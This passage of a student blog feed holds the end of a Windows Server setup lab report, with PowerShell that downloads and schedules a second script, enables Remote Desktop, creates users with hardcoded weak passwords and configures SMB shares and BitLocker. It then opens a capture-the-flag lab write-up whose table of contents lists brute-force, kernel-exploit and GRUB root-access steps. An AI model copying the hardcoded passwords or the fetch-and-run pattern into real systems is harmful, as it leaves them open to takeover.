<p>To download the second script, <code>Invoke-WebRequest</code> is used again with a <code>url</code> and <code>dest</code> variable to store the desired URL and destination file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$url = <span style="color:#e6db74">&#34;https://raw.githubusercontent.com/Stefanistkuhl/obsidianschule/refs/heads/main/3.Klasse/itsi/aufgaben/windoof/script.ps1&#34;</span>
</span></span><span style="display:flex;"><span>$dest = <span style="color:#e6db74">&#34;C:\Users\Administrator\script.ps1&#34;</span>
</span></span><span style="display:flex;"><span>Invoke-WebRequest -Uri $url -OutFile $dest
</span></span></code></pre></div><hr>
<h5 id="enabling-remote-desktop">Enabling Remote Desktop</h5>
<p>For easier management and testing of users, we choose to enable Remote Desktop.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Set-ItemProperty -Path <span style="color:#e6db74">&#39;HKLM:\System\CurrentControlSet\Control\Terminal Server&#39;</span> -name <span style="color:#e6db74">&#34;fDenyTSConnections&#34;</span> -value <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>Enable-NetFirewallRule -DisplayGroup <span style="color:#e6db74">&#34;Remote Desktop&#34;</span>
</span></span></code></pre></div><p><!-- raw HTML omitted -->Enable-Remote-Desktop<sup id="fnref:10"><a href="#fn:10" class="footnote-ref" role="doc-noteref">10</a></sup><!-- raw HTML omitted --></p>
<hr>
<h5 id="creating-a-scheduled-task">Creating a Scheduled Task</h5>
<p>Since a restart is needed for the first part, some form of persistence is required for the second script to execute. For this, Windows Scheduled Tasks are used to execute the second script after a reboot with a set trigger.<!-- raw HTML omitted -->New-ScheduledTask<sup id="fnref:11"><a href="#fn:11" class="footnote-ref" role="doc-noteref">11</a></sup><!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$Action = New-ScheduledTaskAction -Execute <span style="color:#e6db74">&#34;powershell.exe&#34;</span> -Argument <span style="color:#e6db74">&#34;-file C:\Users\Administrator\script.ps1&#34;</span>
</span></span><span style="display:flex;"><span>$Trigger = New-ScheduledTaskTrigger -AtLogon -User <span style="color:#e6db74">&#34;Administrator&#34;</span>
</span></span><span style="display:flex;"><span>$Settings = New-ScheduledTaskSettingsSet
</span></span><span style="display:flex;"><span>Register-ScheduledTask -TaskName <span style="color:#e6db74">&#34;after-setup&#34;</span> -Action $Action -Trigger $Trigger -Settings $Settings
</span></span><span style="display:flex;"><span>Restart-Computer
</span></span></code></pre></div><figure>
    <img loading="lazy" src="/itsi/y3/ex8/images/tasksh.png"/> <figcaption>
            Figure 3: Inspecting the created task in task scheduler
        </figcaption>
</figure>

<hr>
<h4 id="the-second-script">The second script</h4>
<p>Now that the setup script has finished running, after logging in as the administrator again, the second script will be launched.</p>
<h5 id="creating-users-and-adding-them-to-groups">Creating Users and Adding Them to Groups</h5>
<p>In this step, two new users will be created: <code>fus-admin</code> and <code>fus-user</code>. These serve as the administrator&rsquo;s low-privileged account and privileged account, respectively, in this scenario.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$supersurepassword = ConvertTo-SecureString <span style="color:#e6db74">&#34;rafi123_&#34;</span> -AsPlainText
</span></span><span style="display:flex;"><span>New-LocalUser -Name <span style="color:#e6db74">&#39;fus-admin&#39;</span> -Password $supersurepassword
</span></span><span style="display:flex;"><span>New-LocalUser -Name <span style="color:#e6db74">&#39;fus-user&#39;</span> -Password $supersurepassword
</span></span><span style="display:flex;"><span>Add-LocalGroupMember -Group <span style="color:#e6db74">&#34;Administrators&#34;</span> -Member fus-admin
</span></span><span style="display:flex;"><span>Add-LocalGroupMember -Group <span style="color:#e6db74">&#34;Remote Desktop Users&#34;</span> -Member fus-user
</span></span></code></pre></div><p><!-- raw HTML omitted -->ConvertTo-SecureString<sup id="fnref:12"><a href="#fn:12" class="footnote-ref" role="doc-noteref">12</a></sup><!-- raw HTML omitted --><!-- raw HTML omitted -->New-LocalUser<sup id="fnref:13"><a href="#fn:13" class="footnote-ref" role="doc-noteref">13</a></sup><!-- raw HTML omitted --><!-- raw HTML omitted -->Add-LocalGroupMember<sup id="fnref:14"><a href="#fn:14" class="footnote-ref" role="doc-noteref">14</a></sup><!-- raw HTML omitted --></p>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex8/images/fus-admin&amp;&amp;fus-user.png"/> <figcaption>
            Figure 4: Verifying the functionality of the two users
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex8/images/fus-net-user.png"/> <figcaption>
            Figure 5: Printing information about the users
        </figcaption>
</figure>
</p>
<hr>
<h5 id="resizing-the-disk-and-creating-a-new-partition">Resizing the Disk and Creating a New Partition</h5>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Resize-Partition -DiskNumber <span style="color:#ae81ff">0</span> -PartitionNumber <span style="color:#ae81ff">2</span> -Size (<span style="color:#ae81ff">40</span>GB)
</span></span><span style="display:flex;"><span>New-Partition -DiskNumber <span style="color:#ae81ff">0</span> -UseMaximumSize -DriveLetter B
</span></span><span style="display:flex;"><span>Format-Volume -DriveLetter B -FileSystem NTFS -AllocationUnitSize <span style="color:#ae81ff">4096</span>
</span></span></code></pre></div><p><!-- raw HTML omitted -->Resize-Partition<sup id="fnref:15"><a href="#fn:15" class="footnote-ref" role="doc-noteref">15</a></sup><!-- raw HTML omitted --><!-- raw HTML omitted -->New-Partition<sup id="fnref:16"><a href="#fn:16" class="footnote-ref" role="doc-noteref">16</a></sup><!-- raw HTML omitted --><!-- raw HTML omitted -->Volumes<sup id="fnref:17"><a href="#fn:17" class="footnote-ref" role="doc-noteref">17</a></sup><!-- raw HTML omitted --><!-- raw HTML omitted -->Cluster-Size<sup id="fnref:18"><a href="#fn:18" class="footnote-ref" role="doc-noteref">18</a></sup><!-- raw HTML omitted --><!-- raw HTML omitted -->Format-Volume<sup id="fnref:19"><a href="#fn:19" class="footnote-ref" role="doc-noteref">19</a></sup><!-- raw HTML omitted --><!-- raw HTML omitted -->Cluster-Size-2<sup id="fnref:20"><a href="#fn:20" class="footnote-ref" role="doc-noteref">20</a></sup><!-- raw HTML omitted --></p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex8/images/Get-Partition.png"/> <figcaption>
            Figure 6: Printing the partition table
        </figcaption>
</figure>

<hr>
<h5 id="creating-directories">Creating Directories</h5>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$baseDir = <span style="color:#e6db74">&#34;B:\CompanyData&#34;</span>
</span></span><span style="display:flex;"><span>$folders = @(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Administration&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Finance&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;HumanResources&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;IT&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Legal&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Marketing&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Sales&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span> ($folder <span style="color:#66d9ef">in</span> $folders) {
</span></span><span style="display:flex;"><span>    New-Item -Path $baseDir -Name $folder -ItemType Directory
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><figure>
    <img loading="lazy" src="/itsi/y3/ex8/images/show%20spanning-tree.png"/> <figcaption>
            Figure 7: Printing the directory structure
        </figcaption>
</figure>

<hr>
<h5 id="populating-the-directories">Populating the Directories</h5>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$sampleFiles = @(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Budget.xlsx&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;EmployeeList.csv&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;ProjectPlan.pptx&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Report.docx&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span> ($file <span style="color:#66d9ef">in</span> $sampleFiles) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">foreach</span> ($folder <span style="color:#66d9ef">in</span> $folders) {
</span></span><span style="display:flex;"><span>        New-Item -Path <span style="color:#e6db74">&#34;</span>$baseDir<span style="color:#e6db74">\</span>$folder<span style="color:#e6db74">&#34;</span> -Name $file -ItemType File
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><figure>
    <img loading="lazy" src="/itsi/y3/ex8/images/lsr.png"/> <figcaption>
            Figure 8: Recursively listing the files
        </figcaption>
</figure>

<hr>
<h5 id="creating-users-and-groups">Creating Users and Groups</h5>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$groups = @(<span style="color:#e6db74">&#34;Admins&#34;</span>, <span style="color:#e6db74">&#34;Users&#34;</span>, <span style="color:#e6db74">&#34;Guests&#34;</span>)
</span></span><span style="display:flex;"><span>$users = @(<span style="color:#e6db74">&#34;alice&#34;</span>, <span style="color:#e6db74">&#34;bob&#34;</span>, <span style="color:#e6db74">&#34;charlie&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span> ($group <span style="color:#66d9ef">in</span> $groups) {
</span></span><span style="display:flex;"><span>    New-LocalGroup -Name $group
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span> ($user <span style="color:#66d9ef">in</span> $users) {
</span></span><span style="display:flex;"><span>    $password = ConvertTo-SecureString <span style="color:#e6db74">&#34;P@ssw0rd&#34;</span> -AsPlainText
</span></span><span style="display:flex;"><span>    New-LocalUser -Name $user -Password $password
</span></span><span style="display:flex;"><span>    Add-LocalGroupMember -Group <span style="color:#e6db74">&#34;Users&#34;</span> -Member $user
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><figure>
    <img loading="lazy" src="/itsi/y3/ex8/images/theVoices.png"/> <figcaption>
            Figure 9: Diagram of the users, groups and their permissions
        </figcaption>
</figure>

<hr>
<h5 id="verifying-the-creation-of-users-and-groups">Verifying the Creation of users and groups</h5>
<figure>
    <img loading="lazy" src="/itsi/y3/ex8/images/ds2.jpg"/> <figcaption>
            Figure 10: Showing all the groups
        </figcaption>
</figure>

<hr>
<h5 id="managing-ntfs-permissions-using-icacls">Managing NTFS Permissions Using icacls</h5>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>icacls <span style="color:#e6db74">&#34;B:\CompanyData&#34;</span> /grant<span style="color:#960050;background-color:#1e0010">:</span>r <span style="color:#e6db74">&#34;Administrators:(OI)(CI)F&#34;</span> /T
</span></span><span style="display:flex;"><span>icacls <span style="color:#e6db74">&#34;B:\CompanyData&#34;</span> /grant<span style="color:#960050;background-color:#1e0010">:</span>r <span style="color:#e6db74">&#34;Users:(OI)(CI)RX&#34;</span> /T
</span></span><span style="display:flex;"><span>icacls <span style="color:#e6db74">&#34;B:\CompanyData&#34;</span> /grant<span style="color:#960050;background-color:#1e0010">:</span>r <span style="color:#e6db74">&#34;Guests:(OI)(CI)R&#34;</span> /T
</span></span></code></pre></div><figure>
    <img loading="lazy" src="/itsi/y3/ex8/images/icals.png"/> <figcaption>
            Figure 11: Viewing the NTFS permissions of a directory
        </figcaption>
</figure>

<hr>
<h5 id="sharing-the-directories-via-smb">Sharing the Directories via SMB</h5>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>New-SmbShare -Name <span style="color:#e6db74">&#34;CompanyData&#34;</span> -Path <span style="color:#e6db74">&#34;B:\CompanyData&#34;</span> -FullAccess <span style="color:#e6db74">&#34;Administrators&#34;</span>,<span style="color:#e6db74">&#34;Users&#34;</span> -ReadAccess <span style="color:#e6db74">&#34;Guests&#34;</span>
</span></span></code></pre></div><figure>
    <img loading="lazy" src="/itsi/y3/ex8/images/Get-SMBShare.png"/> <figcaption>
            Figure 12: Listing all the active SMB shares
        </figcaption>
</figure>

<hr>
<p>Now, users can only access the files they need via the network share. Since in Section 3.2.10, permissions to the root directory were removed, users do not have access to the entire file structure. In this scenario, this is a central server where each employee either has a local workstation or a thin client and connects to the server remotely.</p>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex8/images/nettest.jpg"/> <figcaption>
            Figure 13: Showing the groups that the test user is part of
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex8/images/nolocacc.jpg"/> <figcaption>
            Figure 14: Trying to access the directories locally on the drive
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex8/images/sharesadge.png"/> <figcaption>
            Figure 15: Trying to access a share that the user has no permission to open
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex8/images/readOnly.jpg"/> <figcaption>
            Figure 16: Trying to create a file in a directory where the user only has read permissions
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex8/images/rw.jpg"/> <figcaption>
            Figure 17: Creating a file in a directory where the user has read and write permissions
        </figcaption>
</figure>
</p>
<hr>
<h5 id="encrypting-the-volume-using-bitlocker">Encrypting the Volume using BitLocker</h5>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Enable-BitLocker -MountPoint <span style="color:#e6db74">&#34;B:&#34;</span> -EncryptionMethod Aes128 -PasswordProtector -Password $supersurepassword
</span></span></code></pre></div><p><!-- raw HTML omitted -->Enable-BitLocker<sup id="fnref:21"><a href="#fn:21" class="footnote-ref" role="doc-noteref">21</a></sup><!-- raw HTML omitted --></p>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex8/images/locked.jpg"/> <figcaption>
            Figure 18: Trying to list the contents of the encrypted volume
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex8/images/unlock.jpg"/> <figcaption>
            Figure 19: Trying to list the contents of the encrypted volume after decrypting it
        </figcaption>
</figure>
</p>
<hr>
<h2 id="references">References</h2>
<p><em>For a full bibliography, see the <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex8/quellen.bib">original BibTeX file</a>.</em></p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>This task definition was generated using ChatGPT.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p>Nico Boehr. Localized Names of Users and Groups in Windows. <a href="https://blog.nicoboehr.de/2014/08/20/localized-names-of-users-and-groups-in-windows">source</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p>sdwheeler. Invoke-WebRequest (Microsoft.PowerShell.Utility) - PowerShell. <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.5">source</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:4">
<p>Agoston, Zsolt. PowerShell Abbreviation Table | OpenTechTips. <a href="https://opentechtips.com/powershell-abbreviation-table">source</a>&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:5">
<p>sdwheeler. Invoke-Expression (Microsoft.PowerShell.Utility) - PowerShell. <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.5">source</a>&#160;<a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:6">
<p>sdwheeler. Set-ExecutionPolicy (Microsoft.PowerShell.Security) - PowerShell. <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.5">source</a>&#160;<a href="#fnref:6" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:7">
<p>JasonGerend. Install-WindowsFeature (ServerManager). <a href="https://learn.microsoft.com/en-us/powershell/module/servermanager/install-windowsfeature?view=windowsserver2025-ps">source</a>&#160;<a href="#fnref:7" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:8">
<p>JasonGerend. BitLocker Module. <a href="https://learn.microsoft.com/en-us/powershell/module/bitlocker/?view=windowsserver2025-ps">source</a>&#160;<a href="#fnref:8" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:9">
<p>sdwheeler. Rename-Computer (Microsoft.PowerShell.Management) - PowerShell. <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/rename-computer?view=powershell-7.5">source</a>&#160;<a href="#fnref:9" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:10">
<p>PowerShell FAQs. How to Enable Remote Desktop Using PowerShell? <a href="https://powershellfaqs.com/enable-remote-desktop-using-powershell">source</a>&#160;<a href="#fnref:10" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:11">
<p>JasonGerend. New-ScheduledTask (ScheduledTasks). <a href="https://learn.microsoft.com/en-us/powershell/module/scheduledtasks/new-scheduledtask?view=windowsserver2025-ps">source</a>&#160;<a href="#fnref:11" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:12">
<p>sdwheeler. ConvertTo-SecureString (Microsoft.PowerShell.Security) - PowerShell. <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring?view=powershell-7.5">source</a>&#160;<a href="#fnref:12" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:13">
<p>sdwheeler. New-LocalUser (Microsoft.PowerShell.LocalAccounts) - PowerShell. <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/new-localuser?view=powershell-5.1">source</a>&#160;<a href="#fnref:13" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:14">
<p>sdwheeler. Add-LocalGroupMember (Microsoft.PowerShell.LocalAccounts) - PowerShell. <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/add-localgroupmember?view=powershell-5.1">source</a>&#160;<a href="#fnref:14" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:15">
<p>JasonGerend. Resize-Partition (Storage). <a href="https://learn.microsoft.com/en-us/powershell/module/storage/resize-partition?view=windowsserver2025-ps">source</a>&#160;<a href="#fnref:15" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:16">
<p>JasonGerend. New-Partition (Storage). <a href="https://learn.microsoft.com/en-us/powershell/module/storage/new-partition?view=windowsserver2025-ps">source</a>&#160;<a href="#fnref:16" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:17">
<p>Laxmansingh@twc. What is difference between Partition, Volume and Logical Drive. <a href="https://www.thewindowsclub.com/difference-between-partition-volume-logical-drive">source</a>&#160;<a href="#fnref:17" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:18">
<p>Watumull, Garrett. Cluster size recommendations for ReFS and NTFS. <a href="https://techcommunity.microsoft.com/blog/filecab/cluster-size-recommendations-for-refs-and-ntfs/425960">source</a>&#160;<a href="#fnref:18" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:19">
<p>JasonGerend. Format-Volume (Storage). <a href="https://learn.microsoft.com/en-us/powershell/module/storage/format-volume?view=windowsserver2025-ps">source</a>&#160;<a href="#fnref:19" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:20">
<p>Amanda. What Is Allocation Unit Size &amp; How to Change It - MiniTool Partition Wizard. <a href="https://www.partitionwizard.com/partitionmanager/file-allocation-unit-size.html">source</a>&#160;<a href="#fnref:20" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:21">
<p>JasonGerend. Enable-BitLocker (BitLocker). <a href="https://learn.microsoft.com/en-us/powershell/module/bitlocker/enable-bitlocker?view=windowsserver2025-ps">source</a>&#160;<a href="#fnref:21" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Babys first CTF</title>
      <link>http://localhost:1313/posts/itsi/year-3/exercise-7/babys-first-ctf/</link>
      <pubDate>Mon, 20 Jan 2025 03:33:09 +0100</pubDate>
      <guid>http://localhost:1313/posts/itsi/year-3/exercise-7/babys-first-ctf/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;Note: this was converted from LaTeX to Markdown using ChatGPT 4.1. The original PDF can be found &lt;a href=&#34;https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex7/UE7_CTF.pdf&#34;&gt;here&lt;/a&gt; along with the &lt;a href=&#34;https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex7/quellen.bib&#34;&gt;bibliography&lt;/a&gt;.&lt;/p&gt;&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h1 id=&#34;ethical-hacking-of-a-ctf-vm&#34;&gt;Ethical hacking of a CTF-VM&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;Laboratory protocol&lt;/strong&gt;&lt;br&gt;
Exercise 7: Ethical hacking of a CTF-VM&lt;br&gt;
&lt;figure&gt;
    &lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/itsi/y3/ex7/images/menheraMagnifier.png&#34;/&gt; &lt;figcaption&gt;
            Figure: Grouplogo
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;strong&gt;Subject:&lt;/strong&gt; ITSI&lt;br&gt;
&lt;strong&gt;Class:&lt;/strong&gt; 3AHITN&lt;br&gt;
&lt;strong&gt;Name:&lt;/strong&gt; Stefan Fürst, Justin Tremurici&lt;br&gt;
&lt;strong&gt;Group Name/Number:&lt;/strong&gt; todo/12&lt;br&gt;
&lt;strong&gt;Supervisor:&lt;/strong&gt; SPAC, ZIVK&lt;br&gt;
&lt;strong&gt;Exercise dates:&lt;/strong&gt; 17-19.1.2025&lt;br&gt;
&lt;strong&gt;Submission date:&lt;/strong&gt; 20.1.2025&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;table-of-contents&#34;&gt;Table of Contents&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#task-definition&#34;&gt;Task definition&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#summary&#34;&gt;Summary&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#complete-network-topology-of-the-exercise&#34;&gt;Complete network topology of the exercise&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#exercise-execution&#34;&gt;Exercise Execution&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#setting-up-the-virtual-machines&#34;&gt;Setting up the virtual machines&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#reconnaissance-scanning-the-network&#34;&gt;Reconnaissance: Scanning the Network&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#reconnaissance-exploring-the-websites&#34;&gt;Reconnaissance: Exploring the websites&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#weaponization-evaluating-the-needed-tools&#34;&gt;Weaponization: Evaluating the needed tools&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#exploitation-using-hydra-to-break-http-basic-authentication&#34;&gt;Exploitation: Using Hydra to break HTTP basic authentication&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#exploitation-using-hydra-to-brute-force-ssh-login&#34;&gt;Exploitation: Using Hydra to brute force SSH login&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#exploring-the-system&#34;&gt;Exploring the system&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#listing-all-the-files&#34;&gt;Listing all the files&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#investigating-the-listening-service&#34;&gt;Investigating the listening service&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#investigating-the-process-flag&#34;&gt;Investigating the process flag&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#further-investigating-the-webserver&#34;&gt;Further investigating the webserver&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#investigating-secret_flagtxt&#34;&gt;Investigating secret_flag.txt&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#exploring-the-new-user&#34;&gt;Exploring the new user&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#finding-the-history-flag&#34;&gt;Finding the history flag&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#it-should-be-over-now-right&#34;&gt;It should be over now, right?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#privilege-escalation-on-linux&#34;&gt;Privilege escalation on Linux&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#using-a-smart-enumeration-tool&#34;&gt;Using a smart enumeration tool&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#trying-a-kernel-level-exploit&#34;&gt;Trying a kernel level exploit&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#trying-to-get-privileges-using-metasploit-and-meterpreter&#34;&gt;Trying to get privileges using Metasploit and Meterpreter&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#getting-root-access-through-editing-the-grub-boot-options&#34;&gt;Getting root access through editing the GRUB boot options&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#obtaining-the-final-flag&#34;&gt;Obtaining the final flag&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#references&#34;&gt;References&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;task-definition&#34;&gt;Task definition&lt;/h2&gt;
&lt;p&gt;This task is based on a Capture the Flag (CTF) challenge, where multiple flags are hidden across an environment and can be found either through exploits or by navigating the system. Two virtual machines are provided: an Ubuntu server, which hosts the flags, and a Kali Linux machine for offensive actions. Both machines operate in a &lt;code&gt;Host-only network&lt;/code&gt;, meaning they can communicate with each other but not with the external internet or other devices.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<blockquote>
<p>Note: this was converted from LaTeX to Markdown using ChatGPT 4.1. The original PDF can be found <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex7/UE7_CTF.pdf">here</a> along with the <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex7/quellen.bib">bibliography</a>.</p></blockquote>
<hr>
<h1 id="ethical-hacking-of-a-ctf-vm">Ethical hacking of a CTF-VM</h1>
<hr>
<p><strong>Laboratory protocol</strong><br>
Exercise 7: Ethical hacking of a CTF-VM<br>
<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/menheraMagnifier.png"/> <figcaption>
            Figure: Grouplogo
        </figcaption>
</figure>

<strong>Subject:</strong> ITSI<br>
<strong>Class:</strong> 3AHITN<br>
<strong>Name:</strong> Stefan Fürst, Justin Tremurici<br>
